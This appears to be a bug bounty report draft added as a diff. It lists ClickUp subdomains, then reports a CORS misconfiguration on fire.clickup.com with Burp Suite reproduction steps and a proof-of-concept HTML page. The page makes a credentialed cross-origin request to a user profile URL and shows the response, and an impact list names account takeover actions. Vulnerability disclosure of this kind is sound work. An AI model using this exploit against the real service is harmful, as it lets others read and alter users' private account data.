@@ -1,0 +1,55 @@
+staging.clickup.com
+fire.clickup.com
+
+
+
+
+https://staging-ws.clickup.com/
+https://water.clickup.com/
+
+
+-----404------
+http://azure.clickup.com/
+https://dev-api.clickup.com/
+https://dev-form-submit.clickup.com/
+https://dev-forms.clickup.com/
+https://dev-share.clickup.com/
+https://docs1.clickup.com/
+
+
+
+
+Summary:
+CORS misconfig is found on fire.clickup.com as Access-Control-Allow-Origin is dynamically fetched from client Origin header with credential true and different methods are enabled as well.
+
+Steps to Reproduce: 
+1) navigate to the below URL 
+https://fire.clickup.com/1200154/settings/profile
+2) intercept the request in burp suite and send it to repeater and click go
+3)as you can see in reponse 
+Access-Control-Allow-Credentials: true
+4) add Origin: null & send request again
+5) as you can see in reponse 
+Access-Control-Allow-Origin: null
+
+Exploit:
+add below code in .html file and open in browser
+
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://fire.clickup.com/1200154/settings/profile',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
+
+Supporting Material/References:
+1)https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
+2)https://hackerone.com/reports/235200
+
+Impact
+Using this misconfig, an attacker can do many actions depending on the functionality of the application which in this case use API and do activities like:
+1) Read, Update, Delete Users information(Email,Location,Bio etc)
+2) Stealing Authenticity_token(CSRF)
+3) Delete social accounts on niche
+4) View private posts of social accounts
+5) Close account
+6) Logout etc.
